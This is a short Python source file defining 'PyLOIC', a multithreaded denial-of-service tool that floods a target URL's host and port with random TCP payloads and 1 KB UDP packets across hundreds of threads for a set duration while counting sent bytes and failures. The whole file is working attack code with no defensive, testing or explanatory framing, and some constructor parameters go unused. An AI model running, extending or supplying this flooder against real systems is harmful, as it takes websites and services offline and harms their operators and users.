import socket
import random
import threading
import time
from urllib.parse import urlparse

class PyLOIC:
    def __init__(self, url, threads=500, sockets=1000, duration=0, proxy_file=None, stats=None):
        self.url = url
        parsed = urlparse(url)
        self.host = parsed.hostname
        self.port = parsed.port or 80
        self.path = parsed.path or '/'
        self.threads = threads
        self.duration = duration
        self.stats = stats
        self.running = False
    
    def _tcp_worker(self):
        """TCP flood"""
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, self.port))
                
                msg = ''.join(random.choices('ABCDEFabcdef0123456789', k=random.randint(100, 500)))
                s.send(msg.encode())
                
                if self.stats:
                    self.stats.increment_sent()
                    self.stats.add_bytes(len(msg))
                s.close()
            except:
                if self.stats:
                    self.stats.increment_failed()
    
    def _udp_worker(self):
        """UDP flood"""
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                msg = random._urandom(1024)
                s.sendto(msg, (self.host, self.port))
                
                if self.stats:
                    self.stats.increment_sent()
                    self.stats.add_bytes(len(msg))
                s.close()
            except:
                if self.stats:
                    self.stats.increment_failed()
    
    def attack(self):
        self.running = True
        
        # Mix TCP and UDP
        for _ in range(self.threads // 2):
            threading.Thread(target=self._tcp_worker, daemon=True).start()
        for _ in range(self.threads // 2):
            threading.Thread(target=self._udp_worker, daemon=True).start()
        
        start = time.time()
        while self.running:
            if self.duration > 0 and (time.time() - start) > self.duration:
                break
            time.sleep(1)
        self.running = False
